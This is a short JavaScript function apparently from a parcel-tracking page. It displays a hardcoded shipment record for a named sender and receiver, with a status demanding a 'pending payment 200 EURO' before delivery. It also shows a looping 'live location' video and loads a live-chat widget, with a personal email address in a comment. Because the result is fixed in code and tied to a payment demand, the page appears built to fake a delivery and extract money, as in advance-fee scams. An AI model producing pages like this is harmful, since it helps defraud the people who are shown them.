function handle34919110LXVN(resultElement) {
    let result = {
        sender: 'Dae bong',
        country: 'Scotland',
        receiver: 'Maria droghetti',
        date: 'Jan 19, 2024',
        location: 'Out for Delivery - Area. Within 24 hours package would get to destined country- pending payment 200 EURO'
    };

    // Display the result
    resultElement.innerHTML = `
        <p>SENDER NAME: ${result.sender}</p>
        <p>SENDER ADDRESS: ${result.country}</p>
        <p>RECIEVERS NAME : ${result.receiver}</p>
        <p>DATE: ${result.date}</p>
                <p><video id="local" 
                src="live.mp4" autoplay muted loop></video>           Live Location: ${result.location}</p>`;

    // Inject the LiveChat script danielpannet12@gmail.com
    const livechatScript = document.createElement('script');
    livechatScript.src = "//code.tidio.co/zylkg8ksc5mqtdng0vuusnoz95vfxxb0.js";
    livechatScript.async = true;
    document.body.appendChild(livechatScript);
}



